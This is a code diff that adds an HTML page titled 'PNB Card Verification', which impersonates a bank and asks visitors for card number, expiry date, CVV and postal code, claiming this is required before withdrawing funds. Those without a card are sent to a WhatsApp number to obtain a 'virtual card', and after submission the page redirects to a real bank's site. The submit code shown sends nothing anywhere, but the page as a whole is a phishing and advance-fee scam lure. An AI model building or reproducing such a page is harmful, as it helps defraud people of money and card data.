@@ -1,0 +1,301 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>PNB Card Submission</title>
+<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+<style>
+  body {
+    margin: 0;
+    font-family: 'Roboto', sans-serif;
+    background-color: #f5f5f5;
+    color: #333;
+  }
+
+  header {
+    background-color: #003366;
+    color: white;
+    padding: 20px;
+    text-align: center;
+    font-size: 1.8em;
+    font-weight: 700;
+  }
+
+  section {
+    max-width: 500px;
+    margin: 30px auto;
+    padding: 20px;
+    background-color: white;
+    border-radius: 12px;
+    box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+  }
+
+  /* Card mockup */
+  .card-mockup {
+    position: relative;
+    width: 100%;
+    padding-top: 60%;
+    border-radius: 20px;
+    background: linear-gradient(135deg, #003366, #0066cc);
+    color: white;
+    font-weight: 500;
+    margin-bottom: 25px;
+    box-shadow: 0 8px 20px rgba(0,0,0,0.2);
+  }
+
+  .card-number, .card-expiry, .card-cvv {
+    position: absolute;
+    font-family: 'Roboto', sans-serif;
+  }
+
+  .card-number {
+    bottom: 50px;
+    left: 20px;
+    font-size: 1.2em;
+    letter-spacing: 2px;
+  }
+
+  .card-expiry {
+    bottom: 20px;
+    left: 20px;
+    font-size: 0.95em;
+  }
+
+  .card-cvv {
+    bottom: 20px;
+    right: 20px;
+    font-size: 0.95em;
+  }
+
+  .input-group {
+    margin-bottom: 15px;
+  }
+
+  input[type="text"], input[type="number"], input[type="month"] {
+    width: 100%;
+    padding: 12px;
+    font-size: 1em;
+    border-radius: 8px;
+    border: 1px solid #ccc;
+    margin-top: 5px;
+    box-sizing: border-box;
+  }
+
+  .row {
+    display: flex;
+    gap: 10px;
+  }
+
+  .row input {
+    flex: 1;
+  }
+
+  .instruction {
+    background-color: #e8f0fe;
+    padding: 15px;
+    border-radius: 10px;
+    margin-top: 20px;
+    font-size: 0.95em;
+  }
+
+  .submit-btn {
+    width: 100%;
+    padding: 15px;
+    background-color: #003366;
+    color: white;
+    font-size: 1.1em;
+    font-weight: 500;
+    border: none;
+    border-radius: 10px;
+    cursor: pointer;
+    margin-top: 20px;
+    transition: background-color 0.3s;
+  }
+
+  .submit-btn:hover {
+    background-color: #0055aa;
+  }
+
+  .loader {
+    border: 5px solid #f3f3f3;
+    border-top: 5px solid #003366;
+    border-radius: 50%;
+    width: 40px;
+    height: 40px;
+    animation: spin 1s linear infinite;
+    margin: 20px auto;
+    display: none;
+  }
+
+  @keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+  }
+
+  @media (max-width: 600px) {
+    .row {
+      flex-direction: column;
+    }
+  }
+</style>
+<style>
+  .customer-support-btn {
+    position: fixed;
+    bottom: 20px;
+    right: 20px;
+    background-color: #25D366; /* WhatsApp green */
+    color: white;
+    border-radius: 50%;
+    width: 60px;
+    height: 60px;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    font-size: 36px;
+    box-shadow: 0 4px 10px rgba(0,0,0,0.3);
+    cursor: pointer;
+    transition: transform 0.2s;
+    z-index: 1000;
+  }
+
+  .customer-support-btn:hover {
+    transform: scale(1.1);
+  }
+
+  /* Optional tooltip */
+  .customer-support-btn[data-tooltip]:hover::after {
+    content: attr(data-tooltip);
+    position: absolute;
+    bottom: 70px;
+    right: 0;
+    background: #003366;
+    color: white;
+    padding: 5px 10px;
+    border-radius: 5px;
+    font-size: 0.85em;
+    white-space: nowrap;
+  }
+</style>
+</head>
+<body>
+
+<header>
+  PNB Card Verification
+</header>
+
+<section>
+  <!-- Card Mockup -->
+  <div class="card-mockup">
+    <div class="card-number" id="display-number">4111 1111 1111 1111</div>
+    <div class="card-expiry" id="display-exp">12/26</div>
+    <div class="card-cvv" id="display-cvv">123</div>
+  </div>
+
+  <!-- Card Input -->
+  <div class="input-group">
+    <label for="card-number">Card Number</label>
+    <input type="text" id="card-number" placeholder="" value="">
+  </div>
+
+  <div class="row">
+    <div class="input-group">
+      <label for="exp-date">Expiration Date</label>
+      <input type="month" id="exp-date" value="">
+    </div>
+    <div class="input-group">
+      <label for="cvv">CVV</label>
+      <input type="number" id="cvv" placeholder="" value="">
+    </div>
+  </div>
+
+  <div class="input-group">
+    <label for="postal">Postal Code</label>
+    <input type="text" id="postal" placeholder="" value="">
+  </div>
+
+  <div class="instruction">
+    Please submit your PNB card for verification. If you do not have a PNB card, click the customer support button to get a virtual card before submitting. This is required before withdrawing funds.
+  </div>
+  <br/>
+  <div><img id="dynamicImage" src="https://pnb-finance.onrender.com/1757828838659.jpg" alt="Description" style="max-width:100%; height:auto; display:block;" /> </div>
+
+  <!-- Google Translate -->
+  <div id="google_translate_element" style="margin-top:20px;"></div>
+
+  <!-- Submit Button -->
+  <button class="submit-btn" onclick="submitCard()">Submit Card</button>
+
+  <!-- Loader -->
+  <div class="loader" id="loader"></div>
+</section>
+<script>
+  /**
+   * Updates the image source and alt text dynamically
+   * @param {string} src - The image URL
+   * @param {string} alt - The alt description
+   */
+  function updateImage(src, alt = '') {
+    const img = document.getElementById('dynamicImage');
+    img.src = src;
+    img.alt = alt;
+  }
+
+  // Example usage:
+  // updateImage('https://example.com/photo.jpg', 'A beautiful view');
+</script>
+<script>
+  // Dynamic card update
+  const cardNumber = document.getElementById('card-number');
+  const expDate = document.getElementById('exp-date');
+  const cvv = document.getElementById('cvv');
+
+  const displayNumber = document.getElementById('display-number');
+  const displayExp = document.getElementById('display-exp');
+  const displayCvv = document.getElementById('display-cvv');
+
+  cardNumber.addEventListener('input', () => {
+    displayNumber.textContent = cardNumber.value || '0000 0000 0000 0000';
+  });
+
+  expDate.addEventListener('input', () => {
+    if(expDate.value) {
+      const [year, month] = expDate.value.split('-');
+      displayExp.textContent = month + '/' + year.slice(2);
+    } else {
+      displayExp.textContent = 'MM/YY';
+    }
+  });
+
+  cvv.addEventListener('input', () => {
+    displayCvv.textContent = cvv.value || '000';
+  });
+
+  // Submit function with loader
+  function submitCard() {
+    const loader = document.getElementById('loader');
+    loader.style.display = 'block';
+
+    setTimeout(() => {
+      loader.style.display = 'none';
+      alert('Card submitted successfully!');
+      window.location.href = "https://www.pnbparibas.com";
+    }, 2000);
+  }
+
+  function googleTranslateElementInit() {
+    new google.translate.TranslateElement({pageLanguage: 'en'}, 'google_translate_element');
+  }
+</script>
+<script src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
+
+
+<a href="https://wa.me/12403670968?text=I%20need%20a%20virtual%20PNB%20card" 
+   target="_blank" 
+   class="customer-support-btn" 
+   data-tooltip="Click to get Virtual PNB Card">
+  <span class="material-icons">support_agent</span>
+</a>
+</body>
+</html>
